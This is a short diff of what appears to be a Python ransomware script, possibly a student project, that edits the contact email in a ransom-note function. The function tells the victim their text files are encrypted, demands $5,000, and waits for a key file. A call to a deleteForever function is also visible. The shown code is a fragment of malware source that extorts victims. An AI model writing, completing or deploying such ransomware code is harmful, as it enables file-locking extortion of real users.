@@ -71,7 +71,7 @@ def deleteForever():
 deleteForever()
 #function to create a ransom note for the user
 def ransomeNote():
-		message = "Your text files are encrypted. To decrypt them, you need to pay me $5,000 and send ransomkey.bin in your folder to saniya_madeeha@uowmail.edu.au"
+		message = "Your text files are encrypted. To decrypt them, you need to pay me $5,000 and send ransomkey.bin in your folder to saniya@uowmail.edu.au"
 		File=input(str(message) + '\n'+"Filename:")
 		while(File!="ransomkey.bin"):
 			File=input("Filename:")
